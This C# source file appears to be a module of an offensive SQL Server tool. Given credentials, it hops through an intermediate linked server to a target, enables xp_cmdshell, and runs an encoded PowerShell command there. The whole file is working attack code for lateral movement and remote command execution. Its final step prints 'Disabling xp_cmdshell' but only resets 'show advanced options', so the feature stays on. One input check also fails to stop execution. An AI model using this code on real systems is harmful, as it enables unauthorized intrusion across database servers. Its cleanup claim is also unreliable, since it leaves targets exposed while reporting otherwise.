using System;
using System.Collections.Generic;
using System.Data.SqlClient;


namespace SharpSQL.Commands
{
    public class dbllinkedxp : ICommand
    {
        public static string CommandName => "dbllinkedxp";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Action: Execute Encoded PowerShell Command on Linked SQL Server via 'xp_cmdshell'");
            Console.WriteLine("\tUsage: SharpSQL.exe dbllinkedxp /db:DATABASE /server:SERVER /intermediate:INTERMEDIATE /target:TARGET /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]\r\n");

            string user = "";
            string password = "";
            string connectInfo = "";
            string database = "";
            string connectserver = "";
            string intermediate = "";
            string target = "";
            string cmd = "";

            bool sqlauth = false;

            if (arguments.ContainsKey("/sqlauth"))
            {
                sqlauth = true;
            }
            if (arguments.ContainsKey("/db"))
            {
                database = arguments["/db"];
            }
            if (arguments.ContainsKey("/server"))
            {
                connectserver = arguments["/server"];
            }
            if (arguments.ContainsKey("/intermediate"))
            {
                intermediate = arguments["/intermediate"];
            }
            if (arguments.ContainsKey("/target"))
            {
                target = arguments["/target"];
            }
            if (arguments.ContainsKey("/command"))
            {
                cmd = arguments["/command"];
            }

            if (String.IsNullOrEmpty(database))
            {
                Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(connectserver))
            {
                Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(intermediate))
            {
                Console.WriteLine("\r\n[X] You must supply an intermediate server!\r\n");
            }
            if (String.IsNullOrEmpty(target))
            {
                Console.WriteLine("\r\n[X] You must supply a target server!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(cmd))
            {
                Console.WriteLine("\r\n[X] You must supply a command to execute!\r\n");
                return;
            }

            if (sqlauth)
            {
                if (arguments.ContainsKey("/user"))
                {
                    user = arguments["/user"];
                }
                if (arguments.ContainsKey("/password"))
                {
                    password = arguments["/password"];
                }
                if (String.IsNullOrEmpty(user))
                {
                    Console.WriteLine("\r\n[X] You must supply the SQL account user!\r\n");
                    return;
                }
                if (String.IsNullOrEmpty(password))
                {
                    Console.WriteLine("\r\n[X] You must supply the SQL account password!\r\n");
                    return;
                }
                connectInfo = "Data Source= " + connectserver + "; Initial Catalog= " + database + "; User ID=" + user + "; Password=" + password;
            }
            else
            {
                connectInfo = "Server = " + connectserver + "; Database = " + database + "; Integrated Security = True;";
            }

            SqlConnection connection = new SqlConnection(connectInfo);

            try
            {
                connection.Open();
                Console.WriteLine($"[+] Authentication to the '{database}' Database on '{connectserver}' Successful!");
            }
            catch
            {
                Console.WriteLine($"[-] Authentication to the '{database}' Database on '{connectserver}' Failed.");
                Environment.Exit(0);
            }

            string enableAdvOptions = $"EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT {target}') AT {intermediate}";
            SqlCommand command = new SqlCommand(enableAdvOptions, connection);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Enabling Advanced options..");
            reader.Close();

            string enableXP = $"EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT {target}') AT {intermediate}";
            command = new SqlCommand(enableXP, connection);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Enabling xp_cmdshell..");
            reader.Close();

            string execCmd = $"EXEC ('EXEC (''xp_cmdshell ''''powershell -enc {cmd}'''';'') AT {target}') AT {intermediate}";
            command = new SqlCommand(execCmd, connection);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Executing command..");
            reader.Close();

            string disableXP = $"EXEC ('EXEC (''sp_configure ''''show advanced options'''', 0; RECONFIGURE;'') AT {target}') AT {intermediate}";
            command = new SqlCommand(disableXP, connection);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Disabling xp_cmdshell..");
            reader.Close();

            connection.Close();
        }
    }
}
